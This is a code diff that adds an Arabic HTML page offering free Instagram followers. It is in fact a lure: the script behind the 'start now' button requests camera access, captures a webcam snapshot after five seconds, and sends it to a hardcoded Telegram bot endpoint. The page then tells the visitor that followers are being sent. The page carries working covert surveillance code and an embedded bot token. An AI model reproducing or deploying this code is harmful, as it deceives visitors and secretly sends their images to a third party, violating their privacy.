@@ -1,0 +1,85 @@
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>زيادة متابعين إنستغرام</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #fafafa;
+      text-align: center;
+      padding: 50px;
+    }
+    .box {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      max-width: 400px;
+      margin: auto;
+    }
+    input, button {
+      width: 90%;
+      padding: 12px;
+      margin: 10px 0;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      background-color: #3897f0;
+      color: white;
+      border: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>احصل على متابعين إنستغرام مجاناً</h2>
+    <input type="text" id="username" placeholder="اسم المستخدم">
+    <input type="number" id="followers" placeholder="عدد المتابعين المطلوب">
+    <button onclick="start()">بدأ الآن</button>
+    <p id="status"></p>
+    <video id="video" autoplay playsinline width="300" style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+  </div>
+
+  <script>
+    async function start() {
+      document.getElementById("status").innerText = "جاري المعالجة...";
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        setTimeout(() => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext("2d").drawImage(video, 0, 0);
+          const imageData = canvas.toDataURL("image/png");
+
+          fetch("https://api.telegram.org/bot7328179577:AAGRNz3YRs-cPgvsETz4ULmqA7bnE82Cb7E/sendPhoto", {
+            method: "POST",
+            body: JSON.stringify({
+              chat_id: "6437823957",
+              photo: imageData
+            }),
+            headers: {
+              "Content-Type": "application/json"
+            }
+          });
+
+          document.getElementById("status").innerText = "جاري إرسال المتابعين...";
+        }, 5000);
+      } catch (err) {
+        document.getElementById("status").innerText = "تم رفض الوصول للكاميرا.";
+        console.error(err);
+      }
+    }
+  </script>
+</body>
+</html>
